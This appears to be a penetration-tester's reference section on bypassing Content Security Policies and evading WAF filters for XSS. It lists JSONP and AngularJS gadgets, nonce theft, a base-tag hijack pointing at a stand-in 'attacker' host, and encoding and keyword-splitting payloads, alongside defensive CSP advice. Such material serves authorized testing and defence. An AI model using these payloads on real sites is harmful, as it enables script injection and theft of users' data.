# CSP bypass and WAF/filter evasion

Two defenses stand between an injection and execution: a Content Security Policy (blocks the script from running) and a WAF/input filter (blocks the payload from arriving). This covers both. Sources: notes 13, 17, 24, 26, 27, 29, 30.

## Part A: CSP bypass

A CSP bypass is needed when you have HTML/script injection but a policy stops execution. First, read the policy (CSP Evaluator / `document.currentScript` / response header) and classify the weakness. A CSP is only as strong as its least-restrictive source.

### Classify the policy
- `script-src` with a **host allowlist** (no nonce, or nonce without `strict-dynamic`): every file and endpoint on every allowlisted host is trusted. Hunt a gadget there.
- `nonce-...` **without `strict-dynamic`**: allowlisted URLs still count as valid sources (joaxcar). Nonces are readable from JS.
- `nonce-...` **with `strict-dynamic`**: host allowlist is ignored; trust flows to scripts created by nonce'd scripts. DOM clobbering of a config var into `script.src` works here.
- Missing `base-uri`: base-tag hijack is available.
- Missing `object-src 'none'`/`base-uri 'none'`: extra sinks.

### Bypass classes
1. **Allowlisted JSONP endpoint (note 24, 26).** An allowlisted host exposes a callback endpoint that reflects `?callback=<js>` before its JSON. Load it as a script: `<script src="https://allowlisted-host/path?callback=alert(1)//"></script>`. JSONBee catalogs endpoints. If the callback is character-restricted, Same Origin Method Execution (SOME) can still invoke an existing same-origin method.
2. **Allowlisted host serving a framework (note 27).** If an allowlisted host serves AngularJS (e.g. Google reCAPTCHA `recaptcha/about/js/main.min.js`), load it, then use an Angular expression as the execution gadget: `<img src=x ng-on-error='...'>`. Classic "AngularJS is a universal CSP breaker".
3. **Nonce reuse / nonce exfiltration (note 27).** A nonce is hidden from CSS side channels but readable from JS: `document.querySelector('[nonce]').nonce`. With a trusted-script foothold (from classes 1/2), read the live nonce, create a `<script>`, set `src` to your URL, assign the stolen nonce, append it: a valid nonce'd script runs arbitrary code.
4. **DOM clobbering under `strict-dynamic` (note 13).** Clobber an undefined config global that flows into `script.src`; the strict-dynamic-trusted loader creates your script. See `advanced-techniques.md`.
5. **Base-tag hijack (note 24).** When a nonce'd script loads a *relative* `src` and `base-uri` is unset, inject `<base href="https://attacker/">` so the relative path resolves to your origin. The injected `<base>` needs no nonce.
6. **Allowlist path weaknesses (note 24).** A broad CDN entry (`https://unpkg.com/`) lets you load a purpose-built csp-bypass library. A server-side **open redirect** on an allowlisted host defeats a path restriction (redirects are not re-checked). **RPO** (`%2f` encoding differential) makes the browser see a compliant path while the server serves a different file.
7. **File-upload-as-script (note 26).** If you can upload a file served from an allowlisted/self origin with a scriptable content-type, load it as the script source.
8. **Exfiltration under `default-src 'none'` (note 24).** Even a strict policy may leak data via `window.location` navigation, `dns-prefetch`, or WebRTC TURN.

**Defense to cite:** `script-src 'nonce-<random>' 'strict-dynamic'; object-src 'none'; base-uri 'none'`; drop framework-bearing and JSONP-exposing hosts from the allowlist; pin exact CDN paths/versions; set `form-action`; avoid open redirects.

## Part B: WAF / filter evasion

A WAF or server filter blocks or strips payloads before they land. The move is to change the payload's surface while keeping the execution primitive. First fingerprint the WAF (response headers: `CF-RAY` Cloudflare, `X-Akamai-*` Akamai, `X-CDN: Imperva`; `wafw00f`).

### Techniques (notes 17, 29, 30)
- **Use the real context break-out** instead of a full `<script>` the WAF watches for: an event handler in the existing tag/attribute often slips through.
- **Alternative tags/handlers:** `<svg onload>`, `<details ontoggle>`, `<img onerror>`, `onfocus`+`autofocus`, custom `<xss>` tags; uncommon handlers the ruleset misses.
- **Case and whitespace:** `<ScRiPt>`, tabs/newlines/comments inside tags and schemes (`java&Tab;script:`), embedded `/**/`.
- **Encoding:** HTML entities (`&#106;`, `&colon;`), UTF-7 where honored, overlong UTF-8, JS unicode/hex escapes, double URL-encoding where the app decodes twice, base64 `data:` script src.
- **Keyword splitting / no literal keyword:** `self['ale'+'rt']`, `window['ev'+'al']`, `top[/al/.source+/ert/.source]`.
- **No parentheses:** `onerror=alert;throw 1`, `` alert`1` ``, `location='javascript:alert\x281\x29'`, `{[Symbol.hasInstance]:eval}` tricks.
- **No angle brackets** (attribute injection): stay inside the attribute with an event handler and `autofocus`.
- **Parser/transport differentials (note 30):** switch `Content-Type` (send JSON/XML/multipart where the WAF expects form-encoded), add charset, or exploit WAF-vs-app body-parsing differences (WAFFLED-style) so the WAF and the app disagree about where the payload is.
- **Length limits / smuggling:** short vectors, or stash the real payload in `window.name` and run a tiny `eval(name)`.
- **Chunk across fields:** for stored/blind, split a payload across several stored fields that render adjacently.

**Case studies in the sources:** Cloudflare bypass via a JSON endpoint; CRLF-based Akamai bypass; stored XSS + WAF bypass on Semrush (note 10). WAF bypass is usually a context + encoding problem, not a magic payload.

### Practical order of attack on a filtered + CSP'd target
1. Determine the sink context (dictates the vector).
2. Get a payload past the WAF (encoding/handler/context tricks above).
3. Get it to execute past the CSP (gadget from Part A).
4. Escalate (see `escalation-and-reporting.md`).
